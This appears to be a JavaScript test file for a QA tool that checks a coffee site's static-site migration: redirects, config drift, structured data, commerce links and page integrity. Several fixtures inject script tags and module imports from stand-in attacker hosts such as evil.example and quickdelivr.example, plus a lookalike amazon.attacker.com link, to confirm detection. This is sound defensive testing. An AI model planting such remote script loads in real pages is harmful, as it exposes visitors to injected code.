// --- T2 protocol/host canonicalisation chains ---
const canon = () => [
  { id: 'http-apex', type: 'canonicalisation', from: 'http://bonafidenitro.com/*', to: 'https://bonafidenitro.com/*', status: 301, state: 'defined' },
  { id: 'http-www', type: 'canonicalisation', from: 'http://www.bonafidenitro.com/*', to: 'https://bonafidenitro.com/*', status: 301, state: 'defined' },
  { id: 'https-www', type: 'canonicalisation', from: 'https://www.bonafidenitro.com/*', to: 'https://bonafidenitro.com/*', status: 301, state: 'defined' },
];
test('canonicalisation rules as declared are one hop (no chain)', () => {
  const fx = makeFixture();
  try { putRules(fx, ...canon()); assert.deepEqual(codes(run(fx)), []); } finally { cleanup(fx); }
});
detects('http apex redirected to www, then www to apex (two hops)', (fx) => {
  const c = canon(); c[0].to = 'https://www.bonafidenitro.com/*'; putRules(fx, ...c);
}, 'T2:chain');
detects('canonicalisation loop between http and https rules', (fx) => {
  putRules(fx, { id: 'a', type: 'canonicalisation', from: 'https://www.bonafidenitro.com/*', to: 'http://www.bonafidenitro.com/*', status: 301, state: 'defined' }, { id: 'b', type: 'canonicalisation', from: 'http://www.bonafidenitro.com/*', to: 'https://www.bonafidenitro.com/*', status: 301, state: 'defined' });
}, 'T2:loop');

// --- T13 config ---
test('detects: astro config drift (trailingSlash / format / output)', () => {
  const fx = makeFixture();
  try {
    const ok = run(fx, 'strict', { astroConfig: "output: 'static', trailingSlash: 'always', build: { format: 'directory' }" });
    assert.deepEqual(ok.findings, []);
    const bad = run(fx, 'foundation', { astroConfig: "output: 'server', trailingSlash: 'never', build: { format: 'file' }" });
    assert.deepEqual(codes(bad).sort(), ['T13:astro-build-format', 'T13:astro-output', 'T13:astro-trailing-slash']);
    assert.equal(bad.passed, false);
  } finally { cleanup(fx); }
});
test('detects: site.yaml trailing-slash drift', () => {
  const fx = makeFixture();
  try {
    fx.site.trailingSlash = 'never';
    assert.ok(codes(run(fx, 'foundation')).includes('T13:site-trailing-slash'));
  } finally { cleanup(fx); }
});

// --- explicit modes ---
test('foundation mode: scaffold placeholders are reported as migration-remaining, never silently OK; strict blocks them', () => {
  const fx = makeFixture();
  try {
    fx.put('about/index.html', page({ p: '/about/', title: 'Scaffold', scaffold: true, robots: 'noindex' }));
    fx.put('404.html', page({ p: '/404.html', title: 'nf', canonical: null, scaffold: true }));
    const f = run(fx, 'foundation');
    assert.equal(f.passed, true);
    assert.equal(f.strictWouldPass, false);
    assert.ok(codes(f).includes('T5:placeholder-page') && codes(f).includes('T3:noindex-on-indexable') && codes(f).includes('T1:placeholder-404'));
    assert.ok(f.migrationRemaining.length >= 3);
    const s = run(fx, 'strict');
    assert.equal(s.passed, false);
    assert.equal(s.blocking.length, s.findings.length);
  } finally { cleanup(fx); }
});
test('scaffold marker does not excuse invariants (cross-canonical / multiple H1 on a scaffold page still fail foundation)', () => {
  const fx = makeFixture();
  try {
    fx.put('about/index.html', page({ p: '/about/', title: 'S', scaffold: true, canonical: 'https://bonafidenitro.com/', body: '<h1>2</h1>' }));
    const f = run(fx, 'foundation');
    assert.equal(f.passed, false);
    assert.ok(codes(f).includes('T3:cross-canonical') && codes(f).includes('T4:h1-multiple'));
  } finally { cleanup(fx); }
});
test('unknown mode is rejected (no hidden skip mode)', () => {
  const fx = makeFixture();
  try { assert.throws(() => run(fx, 'lenient'), /unknown QA mode/); } finally { cleanup(fx); }
});

// --- end-to-end: the real CLI process, exit codes, and the real built dist/ ---
const cli = (args) => spawnSync(process.execPath, ['qa/cli.mjs', ...args], { encoding: 'utf8' });
const haveDist = fs.existsSync('dist/products/index.html');

test('CLI: rejects unknown mode with exit 2', () => {
  assert.equal(cli(['--mode', 'lenient']).status, 2);
});
test('CLI: strict mode fails on a fixture missing protected URLs; foundation mode reports them without blocking', () => {
  const fx = makeFixture();
  try {
    // healthy for a *different* manifest, so the real manifest's protected URLs are missing
    const strict = cli(['--mode', 'strict', '--dist', fx.dir]);
    assert.equal(strict.status, 1);
    assert.match(strict.stdout, /STRICT MIGRATION QA: FAIL/);
    assert.match(strict.stdout, /protected-url-missing/);
  } finally { cleanup(fx); }
});
test('CLI (real dist/): foundation passes and states migration is incomplete; strict fails', { skip: !haveDist }, () => {
  const f = cli(['--mode', 'foundation']);
  assert.equal(f.status, 0, f.stdout + f.stderr);
  assert.match(f.stdout, /FOUNDATION QA: PASS/);
  assert.match(f.stdout, /MIGRATION IS NOT COMPLETE/);
  assert.match(f.stdout, /MIGRATION WORK REMAINING/);
  const s = cli(['--mode', 'strict']);
  assert.equal(s.status, 1);
  assert.match(s.stdout, /placeholder/); // every protected route is now built; strict still fails on scaffold pages (was protected-url-missing until Block 10)
  assert.doesNotMatch(s.stdout, /sitemap-absent|robots-absent|placeholder-404/); // emitted by Block 19 (Issue #56)
});
test('CLI (real dist/ copy): injected script string fails foundation mode with exit 1', { skip: !haveDist }, () => {
  const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'qa-dist-'));
  try {
    fs.cpSync('dist', tmp, { recursive: true });
    fs.appendFileSync(path.join(tmp, 'index.html'), '<script src="https://quickdelivr.example/a.js"></script>');
    const r = cli(['--mode', 'foundation', '--dist', tmp]);
    assert.equal(r.status, 1);
    assert.match(r.stdout, /T11 forbidden-string/);
  } finally { fs.rmSync(tmp, { recursive: true, force: true }); }
});
test('CLI (real dist/ copy): a link to /products-2/ fails foundation mode', { skip: !haveDist }, () => {
  const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'qa-dist-'));
  try {
    fs.cpSync('dist', tmp, { recursive: true });
    fs.appendFileSync(path.join(tmp, 'index.html'), '<a href="/products-2/">x</a>');
    const r = cli(['--mode', 'foundation', '--dist', tmp]);
    assert.equal(r.status, 1);
    assert.match(r.stdout, /T8 products2-linked/);
  } finally { fs.rmSync(tmp, { recursive: true, force: true }); }
});
test('real manifests: redirect register passes the QA register checks (pending-decision never executable)', async () => {
  const { loadInputs } = await import('../../qa/cli.mjs');
  const inputs = loadInputs();
  assert.equal(inputs.redirectSchemaError, undefined);
  const fx = makeFixture();
  try {
    const r = run(fx, 'foundation', { baseline: inputs.baseline, redirects: inputs.redirects });
    assert.deepEqual(r.findings.filter((f) => f.check === 'T2'), []);
  } finally { cleanup(fx); }
});

// --- T2 templated AMP chains (ZANETA_DECISION on PR #24) ---
const ampGeneric = { id: 'amp-pattern', type: 'pattern', from: '/<slug>/amp/', to: '/<slug>/', status: 301, state: 'defined' };
const ampBooking = { id: 'thank-you', type: 'exact', from: '/thank-you/', to: '/about/', status: 301, state: 'defined' };
const ampOverride = { id: 'amp-thank-you', type: 'exact', from: '/thank-you/amp/', to: '/book-appointment/', status: 301, state: 'defined' };
detects('templated AMP destination that lands on another redirect source', (fx) => { putRules(fx, ampGeneric, ampBooking); fx.redirects = fx.redirects.filter((x) => x.from !== '/thank-you/amp/'); fx.config.templateSlugs = ['thank-you']; }, 'T2:chain');
test('exact AMP override takes precedence over the generic pattern (no chain), in either register order', () => {
  for (const order of [[ampOverride, ampGeneric, ampBooking], [ampGeneric, ampBooking, ampOverride]]) {
    const fx = makeFixture();
    try { putRules(fx, ...order); fx.config.templateSlugs = ['thank-you']; assert.deepEqual(codes(run(fx)), []); } finally { cleanup(fx); }
  }
});
test('real register: the three booking AMP URLs are exact one-hop 301s to /book-appointment/ with no chain', async () => {
  const { loadInputs } = await import('../../qa/cli.mjs');
  const { redirects, config } = loadInputs();
  assert.deepEqual([...config.templateSlugs].sort(), ['appointment-cancellation-confirmation', 'kegerators', 'my-bookings', 'thank-you']);
  for (const from of ['/thank-you/amp/', '/my-bookings/amp/', '/appointment-cancellation-confirmation/amp/']) {
    const rule = redirects.find((r) => r.from === from);
    assert.ok(rule, from);
    assert.deepEqual([rule.to, rule.status, rule.state], ['/book-appointment/', 301, 'defined']);
  }
  const fx = makeFixture();
  try {
    const r = run(fx, 'foundation', { baseline: loadInputs().baseline, redirects, config });
    assert.deepEqual(r.findings.filter((f) => f.code === 'chain'), []);
    // without the exact overrides the generic rule would chain through the booking redirects
    const stripped = redirects.filter((x) => !x.id.startsWith('amp-booking-'));
    const r2 = run(fx, 'foundation', { baseline: loadInputs().baseline, redirects: stripped, config });
    assert.equal(r2.findings.filter((f) => f.code === 'chain').length, 3); // kegerators has no redirect source, so is not a chain
  } finally { cleanup(fx); }
});

// --- T2 required redirect inventory / T5 wholesale store links / T11 static module imports (Codex round on a9e1896) ---
detects('empty redirect register (required inventory absent)', (fx) => { fx.redirects = []; }, 'T2:required-redirect-missing');
detects('required AMP pattern rule deleted', (fx) => { fx.redirects = fx.redirects.filter((r) => r.from !== '/<slug>/amp/'); }, 'T2:required-redirect-missing');
detects('required host canonicalisation rule deleted', (fx) => { fx.redirects = fx.redirects.filter((r) => r.from !== 'http://www.bonafidenitro.com/*'); }, 'T2:required-redirect-missing');
detects('required legacy plugin rule deleted', (fx) => { fx.redirects = fx.redirects.filter((r) => r.from !== '/services/mango-tea/'); }, 'T2:required-redirect-missing');
detects('required slash-normalisation rule deleted', (fx) => { fx.redirects = fx.redirects.filter((r) => r.from !== '/nitro-cold-brew'); }, 'T2:required-redirect-missing');
detects('required AMP root destination drifted', (fx) => { fx.redirects.find((x) => x.from === '/amp/').to = '/about/'; }, 'T2:required-redirect-destination');
detects('required host canonicalisation destination drifted', (fx) => { fx.redirects.find((x) => x.from === 'http://bonafidenitro.com/*').to = 'https://example.org/*'; }, 'T2:required-redirect-destination');
detects('booking AMP destination drifted', (fx) => { fx.redirects.find((x) => x.from === '/my-bookings/amp/').to = '/'; }, 'T2:required-redirect-destination');
detects('required host rule left undecided', (fx) => { const r = fx.redirects.find((x) => x.from === 'https://www.bonafidenitro.com/*'); r.state = 'pending-decision'; r.to = null; }, 'T2:required-redirect-undecided');

detects('/products-2/ with no store links (manifest has no minStoreLinks)', (fx) => fx.put('products-2/index.html', page({ p: '/products-2/', title: 'Cold Brew Kegs', h1: 'Wholesale', body: `<p>Jittery John's $10 $12</p>` })), 'T5:store-links-min');
detects('/products-2/ with 21 of the 22 store links', (fx) => fx.put('products-2/index.html', page({ p: '/products-2/', title: 'Cold Brew Kegs', h1: 'Wholesale', body: `<p>Jittery John's $10 $12</p>${storeLinks(21)}` })), 'T5:store-links-min');
detects('/products-2/ store minimum cannot be lowered by the manifest', (fx) => { fx.baseline.urls.find((u) => u.path === '/products-2/').minStoreLinks = 1; fx.put('products-2/index.html', page({ p: '/products-2/', title: 'Cold Brew Kegs', h1: 'Wholesale', body: `<p>Jittery John's $10 $12</p>${storeLinks(1)}` })); }, 'T5:store-links-min');

detects('inline module with a static side-effect import from a non-allowlisted host', (fx) => fx.put('about/index.html', page({ p: '/about/', title: 'About us', body: `<script type="module">import "https://evil.example/payload.js"</script>` })), 'T11:unexpected-script-host');
detects('inline module with a static named import from a non-allowlisted host', (fx) => fx.put('about/index.html', page({ p: '/about/', title: 'About us', body: `<script type="module">import { x } from 'https://evil.example/m.js'; x()</script>` })), 'T11:unexpected-script-host');
detects('bundled JS re-export from a non-allowlisted host', (fx) => fx.put('_astro/app.js', `export * from "//evil.example/m.js";`), 'T11:unexpected-script-host');
detects('import map pointing at a non-allowlisted host', (fx) => fx.put('about/index.html', page({ p: '/about/', title: 'About us', body: `<script type="importmap">{"imports":{"lib":"https://evil.example/lib.js"},"scopes":{"/a/":{"x":"//evil.example/x.js"}}}</script>` })), 'T11:unexpected-script-host');
test('same-origin static imports and import maps are not flagged', () => {
  const fx = makeFixture();
  try {
    fx.put('about/index.html', page({ p: '/about/', title: 'About us', body: `<script type="module">import "/_astro/a.js"; import { y } from "https://bonafidenitro.com/_astro/b.js"</script><script type="importmap">{"imports":{"lib":"/_astro/lib.js"}}</script>` }));
    assert.deepEqual(codes(run(fx)), []);
  } finally { cleanup(fx); }
});

// ---- T5 deduplicated destinations + exact-inventory contract (ZANETA_DECISION 2026-09-29) ----
const p2page = (body) => page({ p: '/products-2/', title: 'Cold Brew Kegs', h1: 'Wholesale', body: `<p>Jittery John's $10 $12</p>${body}` });
const repeated = (n) => Array.from({ length: n }, () => '<a href="https://www.nitrocoffee.store/products/p0">s</a>').join('');
detects('/products-2/ 22 copies of one store URL do not satisfy the 22-link contract', (fx) => fx.put('products-2/index.html', p2page(repeated(22))), 'T5:store-links-min');
detects('/products-2/ duplicates differing only by fragment/trailing slash/host case do not count', (fx) => fx.put('products-2/index.html', p2page(Array.from({ length: 22 }, (_, i) => `<a href="https://WWW.nitrocoffee.store/products/p0${i % 2 ? '/' : ''}#x${i}">s</a>`).join(''))), 'T5:store-links-min');
detects('/products/ repeated Amazon URL cannot satisfy a multi-link minimum', (fx) => {
  fx.baseline.urls.find((u) => u.path === '/products/').minAmazonLinks = 3;
  fx.put('products/index.html', page({ p: '/products/', title: 'Cold Brew Kegs', h1: 'Nitro Kegs', body: '<p>Nitro Style</p>' + '<a href="https://www.amazon.com/dp/1">a</a>'.repeat(5) + '<a href="https://www.nitrocoffee.store/products/x">s</a>' }));
}, 'T5:amazon-links-min');
detects('/products/ repeated store URL cannot satisfy a multi-link minimum', (fx) => {
  fx.baseline.urls.find((u) => u.path === '/products/').minStoreLinks = 3;
  fx.put('products/index.html', page({ p: '/products/', title: 'Cold Brew Kegs', h1: 'Nitro Kegs', body: '<p>Nitro Style</p><a href="https://www.amazon.com/dp/1">a</a>' + '<a href="https://www.nitrocoffee.store/products/x">s</a>'.repeat(5) }));
}, 'T5:store-links-min');
detects('exact commerce inventory absent: strict blocked, foundation reports only (migration-remaining)', (fx) => { fx.config.commerceInventory = { pages: { '/products/': { amazon: [], store: [] }, '/products-2/': { store: [] } } }; }, 'T5:commerce-inventory-missing', { invariant: false });
detects('exact commerce inventory section removed entirely is still migration-remaining', (fx) => { delete fx.config.commerceInventory; }, 'T5:commerce-inventory-missing', { invariant: false });
detects('populated inventory but a preserved destination is not rendered', (fx) => { fx.config.commerceInventory.pages['/products-2/'].store[0] = 'https://www.nitrocoffee.store/products/never-rendered'; }, 'T5:commerce-destination-missing');
detects('populated inventory smaller than the /products-2/ 22-URL contract is invalid', (fx) => { fx.config.commerceInventory.pages['/products-2/'].store.length = 5; }, 'T5:commerce-inventory-invalid');
detects('populated inventory with a lookalike host is invalid', (fx) => { fx.config.commerceInventory.pages['/products/'].amazon = ['https://amazon.attacker.com/dp/1']; }, 'T5:commerce-inventory-invalid');
test('populated exact inventory that matches the rendered set passes strict', () => {
  const fx = makeFixture();
  try { const r = run(fx, 'strict'); assert.deepEqual(codes(r).filter((c) => c.startsWith('T5:commerce')), []); } finally { cleanup(fx); }
});

// --- T6 Article + Person on historical posts (Block 23, Issue #64) ---
const POST = '/fixture-post/';
const articleGraph = (over = {}) => [
  { '@type': 'Organization' }, { '@type': 'WebSite' }, { '@type': 'BreadcrumbList' },
  { '@type': 'Article', '@id': 'https://bonafidenitro.com/fixture-post/#article', headline: 'Fixture', datePublished: '2020-01-02', dateModified: '2020-02-03', author: { '@id': 'https://bonafidenitro.com/author/admin/#person' } },
  { '@type': 'Person', '@id': 'https://bonafidenitro.com/author/admin/#person', name: 'John Goerke' },
].map((n) => (over[n['@type']] === undefined ? n : over[n['@type']])).filter(Boolean);
const putPost = (fx, graph, extra = {}) => {
  fx.baseline.urls.push({ path: POST, tier: 2, expect: '200', canonical: 'self', indexable: true, inSitemap: true });
  fx.put('fixture-post/index.html', page({ p: POST, title: 'Fixture post', ...extra, head: `<script type="application/ld+json">${JSON.stringify({ '@context': 'https://schema.org', '@graph': graph })}</script>` }));
};
test('healthy Article + Person post passes strict', () => {
  const fx = makeFixture();
  try { putPost(fx, articleGraph()); assert.ok(!codes(run(fx)).some((c) => c.startsWith('T6:')), codes(run(fx)).join(', ')); } finally { cleanup(fx); }
});
detects('Article + Person absent from a required post route', (fx) => putPost(fx, articleGraph({ Article: null, Person: null })), 'T6:article-schema-count');
detects('Person absent from a required post route', (fx) => putPost(fx, articleGraph({ Person: null })), 'T6:person-schema-count');
detects('duplicate Article on a required post route', (fx) => putPost(fx, [...articleGraph(), ...articleGraph().filter((n) => n['@type'] === 'Article')]), 'T6:article-schema-count');
detects('Article.author not linked to the Person entity', (fx) => putPost(fx, articleGraph({ Article: { '@type': 'Article', headline: 'Fixture', datePublished: '2020-01-02', author: { '@id': 'https://bonafidenitro.com/other#person' } } })), 'T6:article-author-link');
detects('Article without datePublished', (fx) => putPost(fx, articleGraph({ Article: { '@type': 'Article', headline: 'Fixture', author: { '@id': 'https://bonafidenitro.com/author/admin/#person' } } })), 'T6:article-field-missing');
detects('Article on a non-post page (archive/other)', (fx) => fx.put('about/index.html', page({ p: '/about/', title: 'About us', head: `<script type="application/ld+json">${JSON.stringify({ '@context': 'https://schema.org', '@graph': articleGraph() })}</script>` })), 'T6:article-schema-unexpected');
detects('impossible calendar datePublished (2021-02-31)', (fx) => putPost(fx, articleGraph({ Article: { '@type': 'Article', headline: 'Fixture', datePublished: '2021-02-31', author: { '@id': 'https://bonafidenitro.com/author/admin/#person' } } })), 'T6:article-field-invalid');
detects('impossible calendar dateModified (2020-99-99)', (fx) => putPost(fx, articleGraph({ Article: { '@type': 'Article', headline: 'Fixture', datePublished: '2020-01-02', dateModified: '2020-99-99', author: { '@id': 'https://bonafidenitro.com/author/admin/#person' } } })), 'T6:article-field-invalid');
detects('nested Person on a non-post page', (fx) => fx.put('about/index.html', page({ p: '/about/', title: 'About us', head: `<script type="application/ld+json">${JSON.stringify({ '@context': 'https://schema.org', '@graph': [{ '@type': 'Organization', founder: { '@type': 'Person', name: 'X' } }] })}</script>` })), 'T6:article-schema-unexpected');
detects('nested Article on a non-post page', (fx) => fx.put('about/index.html', page({ p: '/about/', title: 'About us', head: `<script type="application/ld+json">${JSON.stringify({ '@context': 'https://schema.org', '@type': 'WebPage', mainEntity: { '@type': 'Article', headline: 'X' } })}</script>` })), 'T6:article-schema-unexpected');
test('valid nested Article + Person on a post route are counted', () => {
  const fx = makeFixture();
  try {
    const [org, site, bc, art, per] = articleGraph();
    putPost(fx, [org, site, bc, { ...art, author: { ...per } }]);
    assert.ok(!codes(run(fx)).some((c) => c.startsWith('T6:article') || c.startsWith('T6:person')), codes(run(fx)).join(', '));
  } finally { cleanup(fx); }
});
detects('qa config declares no historical post routes', (fx) => { fx.config.articleRoutes = []; }, 'T6:article-routes-undeclared');
